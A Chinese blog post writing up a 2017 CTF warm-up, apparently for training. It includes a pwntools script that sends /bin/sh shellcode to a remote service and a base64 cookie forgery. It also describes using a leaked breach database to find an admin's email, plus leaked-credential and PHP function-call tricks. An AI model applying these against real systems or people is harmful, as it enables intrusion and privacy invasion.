---
layout: post
title: 博赛杯热身赛Write Up
date: 2017-07-03 
tags: CTF_WP  
---


## 介绍


　　最初想的是每当自己有所收获便通过博客的方式巩固一下，没想到，等我下次想起博客这回事的时候，已经过去这么久了。中途的收获也没办法细细道来。以后有机会，看看日记里有没有什么线索能让我将碎片化的东西整理一下，重新发出来。
	
　　`HappyCTF`为QQ群安全届娱乐圈发起的以公益为目的的民间网络安全技术比赛，本大赛旨在通过网络安全比赛促进安全行业发展、促进安全从业者之间相互交流。这篇文章仅介绍我个人的热身赛思路以及Write-Up。

## 复写

###猥琐的笑声
　　我印象中此题是第一题，给的提示是`nc ipaddf 1234`这样用意就很明显了，我们只需要打开CMD或者终端使用netcat工具进行连接即可。win如果没有的话下载一个放进C:\Windows\System32重启CMD就可以使用了。UNIX系统一般都有，不过就算没有获取也更加方便，apt yum pip之类的不用再提。

　　然后我们会得到一大堆由福字组成的乱码。然后将其所有复制粘贴到记事本。发现根本看不出所以然，后来看到有人说是二维码，我才知道直接复制粘贴nc的返回结果导致的格式混乱。所以我写了一个py脚本用于socket连接获取然后存入txt。

    #coding:utf8
    import socket
    import re
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect(('9.9.9.10',1234))
    filename='nc.txt'
    test=''
    while True:
        m=sock.recv(150)
        test=test+m
        print len(m)
        if len(m)<100:
            break
    
    f=open(filename,'a')
    f.write(test)
    f.close()

以上都是错误的示范！！！因为有更方便的方式，NetCat自带有输出功能。`nc 9.9.9.10 1234 > 1.txt `这样所有的输出就在1.txt里了。这样很明显就能看出来是一个二维码。但是并不能直接识别。需要将福替换成比较复杂的汉字。然后字体加粗，缩小字号到看不清字。主要在于字不能太大也不能太小，截图后做个反向或者直接扫描就可以识别。最后得到FLAG。

###Easy Login
　　这是一道WEB，考察的是对cookie的使用。打开网页后如下：
　　<div align="center">
	<img src="/images/posts/CTF-WP/1.png" height="300" width="500">
    </div> 
    
　　demo账号密码都是自己填好了的。我们直接登陆看看会有什么。登陆后页面只有一句话。Welcome,But u can't do anything!好吧，这很明显能想到是权限问题。然后网站权限靠什么控制呢？一般都是cookie，所以查看当前网站的cookie。发现有个

	mycookie=ZGVtb0BkYmFwcHNlY3VyaXR5LmNvbS5jbg%3D%3D
　　%3D在URL编码中是`=`，因为结尾的两个`=`所以我们可以看出来这个cookie很有可能是一个base64编码。所以拿去解码试试。结果解出来是`demo@dbappsecurity.com.cn`说明思路是正确的。我试了一下将demo改为admin\administrator等之类的常规管理名，然后base64加密后替换cookie。发现不管用。猜不到管理员的邮箱没办法登陆，一度卡在这里。不过幸运的是，后来F12审查元素的时候，发现其中有这么一段
    <div align="center">
	<img src="/images/posts/CTF-WP/2.png" height="300" width="500">
    </div> 
    
　　所以我们得到了这个页面的作者的名字。那么是不是可以通过名字得到邮箱呢，也许他的邮箱就是管理员的邮箱。随便找个社工库查询一下，发现是CSDN泄露的数据库里的一员。然后得到了其邮箱。base64加密替换cookie登陆成功。FLAG到手。

###Pwn_1

　　因为是UNIX下编译的软件，所以Win有些不兼容，加上不是自己的电脑，没有过于折腾，装虚拟机什么的。OD MINGW下的GDB载入失败后我直接放弃了。后来看WP的时候才发现，IDA可以载入的，不知道当时怎么想的，完全忘记了IDA这种静态分析。
    
    push    ebp
    mov     ebp, esp
    and     esp, 0FFFFFFF0h		//栈地址对齐16字节
    sub     esp, 30h	//分配48（3*16）字节的内存
    mov     dword ptr [esp+8], 14h ; nbytes		//使14h（20）字节存入esp+8代表的地址中
    lea     eax, [esp+13h]		//eax=esp+13h
    mov     [esp+4], eax    ; buf		//esp+4=eax里的值
    mov     dword ptr [esp], 0 ; fd		//0存入esp代表的地址中
    call    _read	//调用read函数
    mov     byte ptr [esp+26h], 0	//0将esp+26h的地址里的值清0
    lea     eax, [esp+13h]	eax=esp+13h
    mov     [esp], eax      ; s		esp=eax存的值
    call    _strlen		//调用strlen
    mov     [esp+4], eax	//esp+4=eax存的值
    mov     dword ptr [esp], offset format ; "%d welcome\n"		//esp=后面那一串
    call    _printf		//调用prinrf
    lea     eax, [esp+13h]		eax=esp+13h
    mov     [esp+2Ch], eax		//esp+2Ch=eax里的值
    mov     eax, [esp+2Ch]		//eax=esp+2Ch里的值
    call    eax		//调用eax
    leave
    retn

　　以上备注纯手打，同一个语法用了不同的描述方式。未特殊注明的皆指地址，如倒数第四行的eax指eax这个地址里的值为esp+2Ch里的值。由此可以看出，输入20字节。从esp+8村道esp+13。最后将其作为返回值放入eax。还调用了eax。那么我们可以传入20字节的shellcode，就能完成对目标的控制。获取FLAG。

 　　python写的脚本如下：

	from pwn import *
	
	shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x 62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
	p=remote('9.9.9.12',8888)
	p.sendline(shellcode)
	p.interactive()

　　pwn是python中的一个专门给Pwn开发的工具包，搜索pwntool就出来了。

###你不是管理员

　　题目描述是 You are not a administrator
	
　　不管那么多，打开页面发现有个登录和注册，那就先注册。然后登陆后提示You are not a administrator。很明显还是一个权限控制Web题，所以查看一下cookie。发现有个username和uid。
	<div align="center">
	<img src="/images/posts/CTF-WP/3.png">
    </div> 
　　又有%3D，仿佛我又看见了base64加密替换的套路。然而并不会出同一样的题，所以解码出来是乱码，后来一直看不出来是什么加密方法，然后卡在这里了。后来看ＷriteUp的时候才发现，套路有够骚的。WP里面把cookie的username替换成了uid,发现用户名变成了uid，可以推测根据uid判断用户。由于不知道加密方式无法直接修改cookie，但是可以用username替换uid。所以思路出来了。注册用户名是管理员uid的用户，然后替换就可以了。但是发现注册名有长度限制，太短无法注册。经测试，注册用户为1aaaaa的用户，登陆替换后发现uid成了1，aaaaa被过滤。所以我们可以一直注册下去直到注册到admin获得权限拿到FLAG。

###管理员的愤怒

　　这道题提示都很普通，`答案为flag{}形式，提交{}内内容即可`等于没有提示。这道题确实给不了什么提示。访问后就一句话。Success in database connection!我还以为是http头注入，试了很久，无果。

　　后来随便扫了一下目录。发现有/include和/dbadmin目录。直接访问这两个目录。
	<div align="center">
	<img src="/images/posts/CTF-WP/4.png" height="300" width="500">
    </div> 

　　这里有个db.php,下下来一看里面有数据库账号密码。
	<div align="center">
	<img src="/images/posts/CTF-WP/5.png" height="300" width="500">
    </div> 

　　所以用这里的账号密码从dbadmin登陆phpadmin，然后查看数据库，有个flag表打开获得FLAG。

###100块钱都不给我

　　这道题要多过分多过分。开始还以为是加密什么。打开后是很多乱码组成的一个100块不给我的图。尝试解密失败后完完全全懵逼了。
	<div align="center">
	<img src="/images/posts/CTF-WP/6.png" height="300" width="500">
    </div> 

　　幸运的是，访问robots.txt的时候。如图：
	<div align="center">
	<img src="/images/posts/CTF-WP/7.png" height="200" width="500">
    </div> 

　　访问之后如下图：
	<div align="center">
	<img src="/images/posts/CTF-WP/8.jpg" height="300" width="500">
    </div> 

　　这里的意思是如果`ctf`参数存在，就得到`ctf`的值，否则为空。将值赋值给变量`a`。如果`a`这个函数存在，则执行`a`这个函数。否则`print <<<DBAPP`。所以我们直接在链接后面加?ctf=xxx，尝试flag等无果。后来尝试phpinfo发现打开了。而flag就在里面。得到FLAG。

###.bash_history

 　　这个就比较简单了，提示是这样的：

`某公司的运维出现了重大失误，我们把.bash_history拷贝下来了，你能帮忙分析吗？`

　　查看附件
	<div align="center">
	<img src="/images/posts/CTF-WP/9.png" height="300" width="500">
    </div> 

　　mysql账号密码泄露，直接mysql3306登陆查看数据库就能得到FLAG。

###救世捷径

　　提示如下：一个名叫CPU的神秘大陆有26个国家，有些国家之间 会有一条无向路，每条路径都有不同的长度和一段神秘代码， 救世主尼奥要从国家1出发，赶往国家26拯救大陆，请你帮 助救世主选择最短路径，而走过的路的神秘代码连接起来便 是flag。提示已经说得很明显了，这是一个算法问题。不过比较简单，我没有写算法来算。直接手动操作得到结果。把结尾为26的找到，然后往前摸，跨度越大，长度越少的额外标记一下。直到找到1。然后把字母连起来，就是FLAG 。

转载请注明：[碎雪的小屋](http://RoyTse.github.io) » ["博赛杯"热身赛Write Up](http://RoyTse.github.io/2017/07/CTF_WriteUp/)  
